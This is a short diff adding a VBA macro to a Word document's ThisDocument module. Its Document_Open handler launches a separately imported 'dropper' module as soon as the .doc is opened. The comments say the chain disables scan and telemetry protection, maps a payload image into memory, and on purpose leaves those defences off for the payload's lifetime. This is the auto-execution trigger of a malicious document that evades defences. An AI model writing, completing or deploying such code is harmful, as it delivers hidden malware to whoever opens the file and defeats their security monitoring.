@@ -1,0 +1,18 @@
+' Paste this into ThisDocument (double-click it in the Project Explorer).
+' Fires the full chain when the .doc is opened.
+' The module name must match the standard module you pasted the dropper into.
+
+' For Dropper_Standalone.bas:
+Private Sub Document_Open()
+    RunCtx_Standalone.Run
+End Sub
+
+' For Dropper.bas (requires WinAPI_Core.bas also imported):
+' Private Sub Document_Open()
+'     RunCtx.Run
+' End Sub
+
+' Note: there is deliberately no Document_Close disarm here. The chain keeps
+' its scan/telemetry protection for the payload's lifetime; process teardown
+' reclaims the redirect and the mapped image anyway. Call DisarmAll manually
+' if you want the neutralizers restored (the mapped payload stays in place).
